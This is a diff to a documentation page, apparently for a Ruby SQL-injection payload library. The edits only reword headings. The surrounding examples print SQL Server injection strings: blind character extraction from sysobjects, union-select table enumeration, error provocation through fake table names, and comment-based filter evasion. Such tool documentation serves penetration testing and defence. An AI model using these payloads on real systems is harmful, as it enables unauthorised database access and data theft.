@@ -68,7 +68,7 @@ sql[1, :and, sql.user_name(), :eq, 'dbo'].to_sql
 # => "1 and user_name() = 'dbo'"
 {% endhighlight %}
 
-Creating errors by calling fake tables:
+Creating errors by calling non-existant tables:
 
 {% highlight ruby %}
 sql[1, :and, :non_existant_table, :eq, '1'].to_sql
@@ -95,14 +95,14 @@ sql[1, :and, sql.ascii(
 # => "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype = 'U'),1,1))) > 116"
 {% endhighlight %}
 
-Finding user supplied tables using the sysObjects table in SQL Server:
+Finding user supplied tables using the `sysObjects` table in SQL Server:
 
 {% highlight ruby %}
 sql[1, :union, :all, :select, [1,2,3,4,5,6,:name], :from, :sysObjects, :where, :xtype, :eq, 'U'].to_sql
 # => "1 union * select (1,2,3,4,5,6,name) from sysObjects where xtype = 'U'"
 {% endhighlight %}
 
-Bypassing filter evasion using comment tags:
+Bypassing filter using `/**/` instead of spaces:
 
 {% highlight ruby %}
 stmt = sql[1, :union, :select, :all, :from, :where]
